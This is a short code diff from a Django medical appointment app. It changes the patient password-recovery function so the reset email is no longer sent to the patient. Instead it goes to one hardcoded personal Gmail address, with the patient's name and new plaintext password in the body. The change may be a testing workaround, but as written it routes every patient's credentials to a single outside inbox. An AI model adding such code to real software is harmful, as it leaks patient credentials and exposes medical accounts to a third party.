@@ -283,9 +283,9 @@ def recuperar_contrasena_paciente(request):
             try:
                 resend.Emails.send({
                     "from": "onboarding@resend.dev",
-                    "to": paciente.email,
-                    "subject": "Recuperacion de contrasena - Turnos Medicos",
-                    "html": f"<p>Tu nueva contrasena es: <strong>{nueva_contrasena}</strong></p><p>Por favor cambiala desde Editar Perfil.</p>"
+                    "to": "lore82laplata@gmail.com",
+                    "subject": "Contrasena de Paciente - Turnos Medicos",
+                    "html": f"<p>Paciente: {paciente.nombre}{paciente.apellido}. Nueva contraseña: <strong>{nueva_contrasena}</strong></p>"
                 })
             except Exception as e:
                 print(f"Error en Resend Paciente: {e}")
